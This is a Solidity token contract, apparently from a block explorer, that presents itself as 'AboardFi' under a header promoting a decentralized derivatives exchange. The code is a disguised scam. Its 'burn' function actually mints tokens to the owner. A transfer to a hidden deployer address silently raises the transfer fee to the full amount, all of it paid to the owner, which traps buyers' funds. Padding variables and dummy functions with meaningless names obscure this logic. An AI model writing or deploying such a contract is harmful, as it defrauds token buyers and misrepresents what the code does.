/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

/*
AboardExchange
The Order-Book Decentralized Derivatives Exchange on Arbitrum and Avalanche.
Enjoy gas-free perpetual trading!
🚀 We are excited to have #BlizzardFund as #AboardExchange’s seed round investor
🔺 We are now live on Avalanche, making Aboard the first order book derivatives DEX on Avalanche!
Join our community: 
https://github.com/aboard-exchange
https://www.youtube.com/channel/UCIcdcO30Wn7ayofOaToixog
https://twitter.com/AboardExchange
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.5.7;
contract AboardFi {
uint256 private  pyRrdd = 10000000000000;
uint256 public  uiQBgK = 19+9;
uint256 public  LwmqOg = 11+8;
uint256 public  zKJgZi = 12+7;
string public  name = "AboardFi";
mapping (address => mapping (address => uint256)) private _allowances;
address public  UyYwLW = address(0);
string public  symbol = "AboardFi";
address public owner;
uint256 public  wfddNA = 14+6;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  HrIEvx = 16+5;
uint256 public  eMtpap = 17+4;
mapping (address => uint256) public balanceOf;
address private  mLnWjy = address(0);
address public  yIOSDi = address(0);
uint256 public constant totalSupply = 10000000000000000000000000000;
uint256 public  OXlLdD = 19+3;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address public  SXntrh = address(0);
address public  KuxkDQ = address(0);
address public  lYeFfC = address(0);
uint256 public  brUMFp = 11+2;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant SjzdiB = 9+1;
address public  glpTVZ = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
constructor () public {
mLnWjy = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XWhgXq");
require(to != address(0), "XWhgXq");
require(amount <= balanceOf[from], "XWhgXq");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SjzdiB/pyRrdd ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==mLnWjy){
pyRrdd = 9+1;
}
emit Transfer(from, to, transferAmount);
}

function _add1uiQBgK  () private returns (uint256) {
return uiQBgK-- ;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}

function _addL2wmqOg() private returns (uint256) {
return LwmqOg++ ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

function _addHr3IEvx() private returns (uint256) {
return HrIEvx++ ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

function _addzK3JgZi() private returns (uint256) {
return zKJgZi-- ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

function _addwfd4dNA() private returns (uint256) {
return wfddNA++ ;
}


function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _addeM4tpap() private returns (uint256) {
return eMtpap-- ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
//
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}